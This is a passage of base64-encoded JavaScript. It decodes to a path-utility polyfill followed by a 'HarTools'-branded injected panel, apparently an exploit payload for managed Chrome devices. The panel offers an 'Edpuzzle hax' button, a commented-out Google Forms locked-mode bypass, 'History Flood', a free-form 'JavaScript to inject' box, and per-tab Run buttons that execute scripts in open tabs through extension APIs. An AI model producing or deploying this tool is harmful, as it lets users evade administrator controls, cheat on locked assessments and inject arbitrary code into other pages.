ICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHZhciBmcm9tQ29kZSA9IGZyb20uY2hhckNvZGVBdChmcm9tU3RhcnQgKyBpKTsKICAgICAgICAgICAgdmFyIHRvQ29kZSA9IHRvLmNoYXJDb2RlQXQodG9TdGFydCArIGkpOwogICAgICAgICAgICBpZiAoZnJvbUNvZGUgIT09IHRvQ29kZSkKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBlbHNlIGlmIChmcm9tQ29kZSA9PT0gNDcpCiAgICAgICAgICAgICAgICBsYXN0Q29tbW9uU2VwID0gaTsKICAgICAgICB9CiAgICAgICAgdmFyIG91dCA9ICcnOwoKICAgICAgICBmb3IgKGkgPSBmcm9tU3RhcnQgKyBsYXN0Q29tbW9uU2VwICsgMTsgaSA8PSBmcm9tRW5kOyArK2kpIHsKICAgICAgICAgICAgaWYgKGkgPT09IGZyb21FbmQgfHwgZnJvbS5jaGFyQ29kZUF0KGkpID09PSA0NykgewogICAgICAgICAgICAgICAgaWYgKG91dC5sZW5ndGggPT09IDApCiAgICAgICAgICAgICAgICAgICAgb3V0ICs9ICcuLic7CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgb3V0ICs9ICcvLi4nOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBpZiAob3V0Lmxlbmd0aCA+IDApCiAgICAgICAgICAgIHJldHVybiBvdXQgKyB0by5zbGljZSh0b1N0YXJ0ICsgbGFzdENvbW1vblNlcCk7CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIHRvU3RhcnQgKz0gbGFzdENvbW1vblNlcDsKICAgICAgICAgICAgaWYgKHRvLmNoYXJDb2RlQXQodG9TdGFydCkgPT09IDQ3KQogICAgICAgICAgICAgICAgKyt0b1N0YXJ0OwogICAgICAgICAgICByZXR1cm4gdG8uc2xpY2UodG9TdGFydCk7CiAgICAgICAgfQogICAgfSwKICAgIF9tYWtlTG9uZzogZnVuY3Rpb24gX21ha2VMb25nKHBhdGgpIHsKICAgICAgICByZXR1cm4gcGF0aDsKICAgIH0sCiAgICBkaXJuYW1lOiBmdW5jdGlvbiBkaXJuYW1lKHBhdGgpIHsKICAgICAgICBhc3NlcnRQYXRoKHBhdGgpOwogICAgICAgIGlmIChwYXRoLmxlbmd0aCA9PT0gMCkgcmV0dXJuICcuJzsKICAgICAgICB2YXIgY29kZSA9IHBhdGguY2hhckNvZGVBdCgwKTsKICAgICAgICB2YXIgaGFzUm9vdCA9IGNvZGUgPT09IDQ3OwogICAgICAgIHZhciBlbmQgPSAtMTsKICAgICAgICB2YXIgbWF0Y2hlZFNsYXNoID0gdHJ1ZTsKICAgICAgICBmb3IgKHZhciBpID0gcGF0aC5sZW5ndGggLSAxOyBpID49IDE7IC0taSkgewogICAgICAgICAgICBjb2RlID0gcGF0aC5jaGFyQ29kZUF0KGkpOwogICAgICAgICAgICBpZiAoY29kZSA9PT0gNDcpIHsKICAgICAgICAgICAgICAgIGlmICghbWF0Y2hlZFNsYXNoKSB7CiAgICAgICAgICAgICAgICAgICAgZW5kID0gaTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlIHsKCiAgICAgICAgICAgICAgICBtYXRjaGVkU2xhc2ggPSBmYWxzZTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAoZW5kID09PSAtMSkgcmV0dXJuIGhhc1Jvb3QgPyAnLycgOiAnLic7CiAgICAgICAgaWYgKGhhc1Jvb3QgJiYgZW5kID09PSAxKSByZXR1cm4gJy8vJzsKICAgICAgICByZXR1cm4gcGF0aC5zbGljZSgwLCBlbmQpOwogICAgfSwKICAgIGJhc2VuYW1lOiBmdW5jdGlvbiBiYXNlbmFtZShwYXRoLCBleHQpIHsKICAgICAgICBpZiAoZXh0ICE9PSB1bmRlZmluZWQgJiYgdHlwZW9mIGV4dCAhPT0gJ3N0cmluZycpIHRocm93IG5ldyBUeXBlRXJyb3IoJyJleHQiIGFyZ3VtZW50IG11c3QgYmUgYSBzdHJpbmcnKTsKCiAgICAgICAgdmFyIHN0YXJ0ID0gMDsKICAgICAgICB2YXIgZW5kID0gLTE7CiAgICAgICAgdmFyIG1hdGNoZWRTbGFzaCA9IHRydWU7CiAgICAgICAgdmFyIGk7CiAgICAgICAgaWYgKGV4dCAhPT0gdW5kZWZpbmVkICYmIGV4dC5sZW5ndGggPiAwICYmIGV4dC5sZW5ndGggPD0gcGF0aC5sZW5ndGgpIHsKICAgICAgICAgICAgaWYgKGV4dC5sZW5ndGggPT09IHBhdGgubGVuZ3RoICYmIGV4dCA9PT0gcGF0aCkgcmV0dXJuICcnOwogICAgICAgICAgICB2YXIgZXh0SWR4ID0gZXh0Lmxlbmd0aCAtIDE7CiAgICAgICAgICAgIHZhciBmaXJzdE5vblNsYXNoRW5kID0gLTE7CiAgICAgICAgICAgIGZvciAoaSA9IHBhdGgubGVuZ3RoIC0gMTsgaSA+PSAwOyAtLWkpIHsKICAgICAgICAgICAgICAgIHZhciBjb2RlID0gcGF0aC5jaGFyQ29kZUF0KGkpOwogICAgICAgICAgICAgICAgaWYgKGNvZGUgPT09IDQ3KSB7CgogICAgICAgICAgICAgICAgICAgIGlmICghbWF0Y2hlZFNsYXNoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0ID0gaSArIDE7CiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKGZpcnN0Tm9uU2xhc2hFbmQgPT09IC0xKSB7CgogICAgICAgICAgICAgICAgICAgICAgICBtYXRjaGVkU2xhc2ggPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgZmlyc3ROb25TbGFzaEVuZCA9IGkgKyAxOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoZXh0SWR4ID49IDApIHsKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjb2RlID09PSBleHQuY2hhckNvZGVBdChleHRJZHgpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoLS1leHRJZHggPT09IC0xKSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCA9IGk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXh0SWR4ID0gLTE7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQgPSBmaXJzdE5vblNsYXNoRW5kOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChzdGFydCA9PT0gZW5kKSBlbmQgPSBmaXJzdE5vblNsYXNoRW5kOwogICAgICAgICAgICBlbHNlIGlmIChlbmQgPT09IC0xKSBlbmQgPSBwYXRoLmxlbmd0aDsKICAgICAgICAgICAgcmV0dXJuIHBhdGguc2xpY2Uoc3RhcnQsIGVuZCk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgZm9yIChpID0gcGF0aC5sZW5ndGggLSAxOyBpID49IDA7IC0taSkgewogICAgICAgICAgICAgICAgaWYgKHBhdGguY2hhckNvZGVBdChpKSA9PT0gNDcpIHsKCiAgICAgICAgICAgICAgICAgICAgaWYgKCFtYXRjaGVkU2xhc2gpIHsKICAgICAgICAgICAgICAgICAgICAgICAgc3RhcnQgPSBpICsgMTsKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSBlbHNlIGlmIChlbmQgPT09IC0xKSB7CgogICAgICAgICAgICAgICAgICAgIG1hdGNoZWRTbGFzaCA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIGVuZCA9IGkgKyAxOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChlbmQgPT09IC0xKSByZXR1cm4gJyc7CiAgICAgICAgICAgIHJldHVybiBwYXRoLnNsaWNlKHN0YXJ0LCBlbmQpOwogICAgICAgIH0KICAgIH0sCiAgICBleHRuYW1lOiBmdW5jdGlvbiBleHRuYW1lKHBhdGgpIHsKICAgICAgICBhc3NlcnRQYXRoKHBhdGgpOwogICAgICAgIHZhciBzdGFydERvdCA9IC0xOwogICAgICAgIHZhciBzdGFydFBhcnQgPSAwOwogICAgICAgIHZhciBlbmQgPSAtMTsKICAgICAgICB2YXIgbWF0Y2hlZFNsYXNoID0gdHJ1ZTsKCiAgICAgICAgdmFyIHByZURvdFN0YXRlID0gMDsKICAgICAgICBmb3IgKHZhciBpID0gcGF0aC5sZW5ndGggLSAxOyBpID49IDA7IC0taSkgewogICAgICAgICAgICB2YXIgY29kZSA9IHBhdGguY2hhckNvZGVBdChpKTsKICAgICAgICAgICAgaWYgKGNvZGUgPT09IDQ3KSB7CgogICAgICAgICAgICAgICAgaWYgKCFtYXRjaGVkU2xhc2gpIHsKICAgICAgICAgICAgICAgICAgICBzdGFydFBhcnQgPSBpICsgMTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChlbmQgPT09IC0xKSB7CgogICAgICAgICAgICAgICAgbWF0Y2hlZFNsYXNoID0gZmFsc2U7CiAgICAgICAgICAgICAgICBlbmQgPSBpICsgMTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoY29kZSA9PT0gNDYpIHsKCiAgICAgICAgICAgICAgICBpZiAoc3RhcnREb3QgPT09IC0xKQogICAgICAgICAgICAgICAgICAgIHN0YXJ0RG90ID0gaTsKICAgICAgICAgICAgICAgIGVsc2UgaWYgKHByZURvdFN0YXRlICE9PSAxKQogICAgICAgICAgICAgICAgICAgIHByZURvdFN0YXRlID0gMTsKICAgICAgICAgICAgfSBlbHNlIGlmIChzdGFydERvdCAhPT0gLTEpIHsKCiAgICAgICAgICAgICAgICBwcmVEb3RTdGF0ZSA9IC0xOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmIChzdGFydERvdCA9PT0gLTEgfHwgZW5kID09PSAtMSB8fAoKICAgICAgICAgICAgcHJlRG90U3RhdGUgPT09IDAgfHwKCiAgICAgICAgICAgIHByZURvdFN0YXRlID09PSAxICYmIHN0YXJ0RG90ID09PSBlbmQgLSAxICYmIHN0YXJ0RG90ID09PSBzdGFydFBhcnQgKyAxKSB7CiAgICAgICAgICAgIHJldHVybiAnJzsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHBhdGguc2xpY2Uoc3RhcnREb3QsIGVuZCk7CiAgICB9LAogICAgZm9ybWF0OiBmdW5jdGlvbiBmb3JtYXQocGF0aE9iamVjdCkgewogICAgICAgIGlmIChwYXRoT2JqZWN0ID09PSBudWxsIHx8IHR5cGVvZiBwYXRoT2JqZWN0ICE9PSAnb2JqZWN0JykgewogICAgICAgICAgICB0aHJvdyBuZXcgVHlwZUVycm9yKCdUaGUgInBhdGhPYmplY3QiIGFyZ3VtZW50IG11c3QgYmUgb2YgdHlwZSBPYmplY3QuIFJlY2VpdmVkIHR5cGUgJyArIHR5cGVvZiBwYXRoT2JqZWN0KTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIF9mb3JtYXQoJy8nLCBwYXRoT2JqZWN0KTsKICAgIH0sCiAgICBwYXJzZTogZnVuY3Rpb24gcGFyc2UocGF0aCkgewogICAgICAgIGFzc2VydFBhdGgocGF0aCk7CiAgICAgICAgdmFyIHJldCA9IHsKICAgICAgICAgICAgcm9vdDogJycsCiAgICAgICAgICAgIGRpcjogJycsCiAgICAgICAgICAgIGJhc2U6ICcnLAogICAgICAgICAgICBleHQ6ICcnLAogICAgICAgICAgICBuYW1lOiAnJwogICAgICAgIH07CiAgICAgICAgaWYgKHBhdGgubGVuZ3RoID09PSAwKSByZXR1cm4gcmV0OwogICAgICAgIHZhciBjb2RlID0gcGF0aC5jaGFyQ29kZUF0KDApOwogICAgICAgIHZhciBpc0Fic29sdXRlID0gY29kZSA9PT0gNDc7CiAgICAgICAgdmFyIHN0YXJ0OwogICAgICAgIGlmIChpc0Fic29sdXRlKSB7CiAgICAgICAgICAgIHJldC5yb290ID0gJy8nOwogICAgICAgICAgICBzdGFydCA9IDE7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgc3RhcnQgPSAwOwogICAgICAgIH0KICAgICAgICB2YXIgc3RhcnREb3QgPSAtMTsKICAgICAgICB2YXIgc3RhcnRQYXJ0ID0gMDsKICAgICAgICB2YXIgZW5kID0gLTE7CiAgICAgICAgdmFyIG1hdGNoZWRTbGFzaCA9IHRydWU7CiAgICAgICAgdmFyIGkgPSBwYXRoLmxlbmd0aCAtIDE7CgogICAgICAgIHZhciBwcmVEb3RTdGF0ZSA9IDA7CgogICAgICAgIGZvciAoOyBpID49IHN0YXJ0OyAtLWkpIHsKICAgICAgICAgICAgY29kZSA9IHBhdGguY2hhckNvZGVBdChpKTsKICAgICAgICAgICAgaWYgKGNvZGUgPT09IDQ3KSB7CgogICAgICAgICAgICAgICAgaWYgKCFtYXRjaGVkU2xhc2gpIHsKICAgICAgICAgICAgICAgICAgICBzdGFydFBhcnQgPSBpICsgMTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChlbmQgPT09IC0xKSB7CgogICAgICAgICAgICAgICAgbWF0Y2hlZFNsYXNoID0gZmFsc2U7CiAgICAgICAgICAgICAgICBlbmQgPSBpICsgMTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoY29kZSA9PT0gNDYpIHsKCiAgICAgICAgICAgICAgICBpZiAoc3RhcnREb3QgPT09IC0xKSBzdGFydERvdCA9IGk7CiAgICAgICAgICAgICAgICBlbHNlIGlmIChwcmVEb3RTdGF0ZSAhPT0gMSkgcHJlRG90U3RhdGUgPSAxOwogICAgICAgICAgICB9IGVsc2UgaWYgKHN0YXJ0RG90ICE9PSAtMSkgewoKICAgICAgICAgICAgICAgIHByZURvdFN0YXRlID0gLTE7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKHN0YXJ0RG90ID09PSAtMSB8fCBlbmQgPT09IC0xIHx8CgogICAgICAgICAgICBwcmVEb3RTdGF0ZSA9PT0gMCB8fAoKICAgICAgICAgICAgcHJlRG90U3RhdGUgPT09IDEgJiYgc3RhcnREb3QgPT09IGVuZCAtIDEgJiYgc3RhcnREb3QgPT09IHN0YXJ0UGFydCArIDEpIHsKICAgICAgICAgICAgaWYgKGVuZCAhPT0gLTEpIHsKICAgICAgICAgICAgICAgIGlmIChzdGFydFBhcnQgPT09IDAgJiYgaXNBYnNvbHV0ZSkgcmV0LmJhc2UgPSByZXQubmFtZSA9IHBhdGguc2xpY2UoMSwgZW5kKTsKICAgICAgICAgICAgICAgIGVsc2UgcmV0LmJhc2UgPSByZXQubmFtZSA9IHBhdGguc2xpY2Uoc3RhcnRQYXJ0LCBlbmQpOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgaWYgKHN0YXJ0UGFydCA9PT0gMCAmJiBpc0Fic29sdXRlKSB7CiAgICAgICAgICAgICAgICByZXQubmFtZSA9IHBhdGguc2xpY2UoMSwgc3RhcnREb3QpOwogICAgICAgICAgICAgICAgcmV0LmJhc2UgPSBwYXRoLnNsaWNlKDEsIGVuZCk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICByZXQubmFtZSA9IHBhdGguc2xpY2Uoc3RhcnRQYXJ0LCBzdGFydERvdCk7CiAgICAgICAgICAgICAgICByZXQuYmFzZSA9IHBhdGguc2xpY2Uoc3RhcnRQYXJ0LCBlbmQpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldC5leHQgPSBwYXRoLnNsaWNlKHN0YXJ0RG90LCBlbmQpOwogICAgICAgIH0KICAgICAgICBpZiAoc3RhcnRQYXJ0ID4gMCkgcmV0LmRpciA9IHBhdGguc2xpY2UoMCwgc3RhcnRQYXJ0IC0gMSk7CiAgICAgICAgZWxzZSBpZiAoaXNBYnNvbHV0ZSkgcmV0LmRpciA9ICcvJzsKICAgICAgICByZXR1cm4gcmV0OwogICAgfSwKICAgIHNlcDogJy8nLAogICAgZGVsaW1pdGVyOiAnOicsCiAgICB3aW4zMjogbnVsbCwKICAgIHBvc2l4OiBudWxsCn07CmNvbnN0IHNsaWRlcyA9IFtdOwpsZXQgYWN0aXZlU2xpZGVJZHggPSAwOwpjb25zdCBoYW5kbGVDYWxsYmFja3NfID0gW107CmNvbnN0IFdBSVRfRk9SX0ZJTklTSCA9IDE7CnJlcXVlc3RBbmltYXRpb25GcmFtZShmdW5jdGlvbiBhKHQpIHsKICAgIGZvciAoY29uc3QgY2Igb2YgaGFuZGxlQ2FsbGJhY2tzXykgewogICAgICAgIGxldCBtOwogICAgICAgIGlmICgobSA9IGNiLmYuYXBwbHkobnVsbCwgW3QgLSBjYi50XSkpKSB7CiAgICAgICAgICAgIGlmIChtID09PSAxKSB7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBoYW5kbGVDYWxsYmFja3NfLnNwbGljZShoYW5kbGVDYWxsYmFja3NfLmluZGV4T2YoY2IpLCAxKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIHJlcXVlc3RBbmltYXRpb25GcmFtZShhKTsKfSk7CmNvbnN0IGhhbmRsZUluQW5pbWF0aW9uRnJhbWUgPSAoY2IsIHRoaXogPSBudWxsLCBhcmdzID0gW10pID0+IHsKICAgIGhhbmRsZUNhbGxiYWNrc18ucHVzaCh7CiAgICAgICAgZjogY2IsCiAgICAgICAgdDogcGVyZm9ybWFuY2Uubm93KCksCiAgICB9KTsKfTsKCmNsYXNzIERlZmF1bHRFeHRlbnNpb25DYXBhYmlsaXRpZXMgewogICAgc3RhdGljIHRlbXBsYXRlID0gYAogIDx0aXRsZT5VbnRpdGxlZCBkb2N1bWVudDwvdGl0bGU+CiAgPGxpbmsgcmVsPSJpY29uIiB0eXBlPSJpbWFnZS94LWljb24iIGhyZWY9Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jcm9zc2pibHkvSGFyVG9vbHMtcmlndG9vbHMxMjhwbHVzL3JlZnMvaGVhZHMvbWFpbi9kb2NzLmljbyI+CiAgPGRpdiBpZD0iZXh0X2RlZmF1bHQiPgogICAgPGRpdiBpZD0iZGVmYXVsdF9leHRlbnNpb25fY2FwYWJpbGl0aWVzIj4KICAgICAgPGRpdiBjbGFzcz0iaGVhZGVyIj4KICAgICAgICA8aW1nIHNyYz0iaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nyb3NzamJseS9IYXJUb29scy1yaWd0b29sczEyOHBsdXMvcmVmcy9oZWFkcy9tYWluL2hhcnRvb2xzLmdpZiIgYWx0PSJIYXJUb29scyBMb2dvIiBjbGFzcz0ibG9nbyIgLz4KICAgICAgICA8aDE+IERlZmF1bHQgRXh0ZW5zaW9uIENhcGFiaWxpdGllcyA8L2gxPgogICAgICA8L2Rpdj4KICAgICAgPGRpdiBpZD0idGFicy1idXR0b25zIj4KICAgICAgICA8cD5PbiB0YWIgdXBkYXRlPC9wPgogICAgICAgIDxkaXYgaWQ9InRvZ2dsZWFibGUtYnV0dG9ucyI+IAoJCTx3aGl0ZWJ1dHRvbnM+CiAgICAgICAgICA8YnV0dG9uIGlkPSJlcnVkYSI+RXJ1ZGE8L2J1dHRvbj4KICAgICAgICAgIDxidXR0b24gaWQ9ImNoaWkiPkNoaWk8L2J1dHRvbj4KICAgICAgICAgIDxidXR0b24gaWQ9ImFkYmxvY2siPkFkYmxvY2s8L2J1dHRvbj4KICAgICAgICAgIDxidXR0b24gaWQ9ImVkcHV6emxlIj5FZHB1enpsZSBoYXg8L2J1dHRvbj4KICAgICAgICAgIDwhLS0gPGJ1dHRvbiBpZD0iZ2xvY2tlZCI+R2Zvcm1zIExvY2tlZCBNb2RlIGJ5cGFzczwvYnV0dG9uPiAtLT4KCQk8L3doaXRlYnV0dG9ucz4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CiAgICAgIDxkaXYgaWQ9Im90aGVyLWJ1dHRvbnMiPgogICAgICAgIDxwPk90aGVyIHNjcmlwdHM8L3A+CgkJPHdoaXRlYnV0dG9ucz4KICAgICAgICA8YnV0dG9uIGlkPSJzd2FtcCI+U3dhbXA8L2J1dHRvbj4KICAgICAgICA8YnV0dG9uIGlkPSJ1cGRhdGUiPlVwZGF0ZSBIYXJ0b29sczwvYnV0dG9uPgogICAgICAgIDxidXR0b24gaWQ9InF1aWNrLXJtdi1ibHQiPlF1aWNrIFJlbW92ZSBCbG9hdCAodXNlZCB3LyBnZm9ybXMgZXh0ZW4pPC9idXR0b24+CiAgICAgICAgPGJ1dHRvbiBpZD0iaHN0ZmxkIj5IaXN0b3J5IEZsb29kPC9idXR0b24+CgkJPC93aGl0ZWJ1dHRvbnM+CiAgICAgIDwvZGl2PgogICAgICA8aDI+RXZhbHVhdGUgY29kZTwvaDE+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgIDx0ZXh0YXJlYSBpZD0iY29kZSIgcGxhY2Vob2xkZXI9IkVudGVyIEphdmFTY3JpcHQgdG8gaW5qZWN0Ij48L3RleHRhcmVhPgogICAgICAgIDwvZGl2PgogICAgICAgIDxidXR0b24gaWQ9ImNvZGUtcnVuIj5SdW48L2J1dHRvbj4KICAgICAgICA8ZGl2IGlkPSJjb2RlLW91dHB1dCI+PC9kaXY+CgogICAgPC9kaXY+CiAgICA8ZGl2IGlkPSJleHRlbnNpb25fdGFic19kZWZhdWx0Ij4KICAgICAgPGJ1dHRvbiBpZD0idGFicmVsb2FkIj5SZWZyZXNoIFRhYnM8L2J1dHRvbj4KICAgICAgPHVsPgogICAgICA8L3VsPgogICAgICA8aW5wdXQgaWQ9IlRhYlVSTElucHV0Ii8+IDxidXR0b24gaWQ9IlRhYlVSTFN1Ym1pdCI+Q3JlYXRlPC9idXR0b24+CiAgICA8L2Rpdj4KICA8L2Rpdj4KICBgOwogICAgdXBkYXRlVGFiTGlzdCgpIHsKICAgICAgICBpZiAodGhpcy5kaXNhcm1lZCkgewogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQoKICAgICAgICBpZiAodGhpcy50YWJMaXN0SW5Qcm9ncmVzcykgewoKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgICAgICB0aGlzLnRhYkxpc3RJblByb2dyZXNzID0gdHJ1ZTsKCiAgICAgICAgY29uc3QgdGFibGlzdCA9IGRvY3VtZW50LmJvZHkucXVlcnlTZWxlY3RvcigiI2V4dGVuc2lvbl90YWJzX2RlZmF1bHQgdWwiKTsKCiAgICAgICAgdGFibGlzdC5pbm5lckhUTUwgPSAiIjsKICAgICAgICBjb25zdCB0aGl6ID0gdGhpczsKICAgICAgICBjaHJvbWUud2luZG93cy5nZXRBbGwoZnVuY3Rpb24od2luKSB7CiAgICAgICAgICAgIHdpbi5mb3JFYWNoKGZ1bmN0aW9uKHYpIHsKICAgICAgICAgICAgICAgIGNocm9tZS50YWJzLnF1ZXJ5KHsKICAgICAgICAgICAgICAgICAgICB3aW5kb3dJZDogdi5pZAogICAgICAgICAgICAgICAgfSwgZnVuY3Rpb24odGFiSW5mb3MpIHsKICAgICAgICAgICAgICAgICAgICB0YWJJbmZvcy5mb3JFYWNoKGZ1bmN0aW9uKGluZm8pIHsKICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgZGl2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICAgICAgICAgICAgICAgICAgICAgIGRpdi5jbGFzc05hbWUgPSAidGFibGlzdC1pdGVtIjsKICAgICAgICAgICAgICAgICAgICAgICAgZGl2LmlubmVySFRNTCA9IGA8aW1nICR7CiAgICAgICAgICAgICAgY2hyb21lLnRhYnMgJiYgKGluZm8uZmF2SWNvblVybD8ubGVuZ3RoID8/IDApID4gMAogICAgICAgICAgICAgICAgPyBgc3JjPSIke2luZm8uZmF2SWNvblVybH0iYAogICAgICAgICAgICAgICAgOiAiIgogICAgICAgICAgICB9Lz48c3BhbiBjbGFzcz0idGFiLW5hbWUiPiR7aW5mby50aXRsZX0gPGxpdHN0dWZmPiAke2luZm8udXJsfTxsaXRzdHVmZj48L3NwYW4+YDsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNocm9tZS5zY3JpcHRpbmcgfHwgY2hyb21lLnRhYnMuZXhlY3V0ZVNjcmlwdCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgcnVuQnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBydW5CdXR0b24udGV4dENvbnRlbnQgPSAiUnVuIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJ1bkJ1dHRvbi5vbmNsaWNrID0gKCkgPT4gcnVuQ29kZSh0cnVlLCBpbmZvLmlkKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpdi5hcHBlbmRDaGlsZChydW5CdXR0b24pOwogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBwcmV2aWV3QnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7CiAgICAgICAgICAgICAgICAgICAgICAgIHByZXZpZXdCdXR0b24udGV4dENvbnRlbnQgPSAiUHJldmlldyI7CgogICAgICAgICAgICAgICAgICAgICAgICBwcmV2aWV3QnV0dG9uLm9uY2xpY2sgPSAoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aGl6LmRpc2FybSA9IHRydWU7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhpei5wcmV2aWV3aW5nID0gdHJ1ZTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUud2luZG93cy51cGRhdGUoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5mby53aW5kb3dJZCwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb2N1c2VkOiB0cnVlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS50YWJzLnVwZGF0ZShpbmZvLmlkLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhY3RpdmU6IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5jdXJyZW50VGltZW91dCA9IHNldFRpbWVvdXQoZnVuY3Rpb24gbSgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGVhclRpbWVvdXQod2luZG93LmN1cnJlbnRUaW1lb3V0KTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLnRhYnMuZ2V0Q3VycmVudChmdW5jdGlvbih0YWIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLndpbmRvd3MudXBkYXRlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFiLndpbmRvd0lkLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9jdXNlZDogdHJ1ZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUudGFicy51cGRhdGUodGFiLmlkLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFjdGl2ZTogdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRoaXouZGlzYXJtID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhpei5wcmV2aWV3aW5nID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LCAxMDApOwo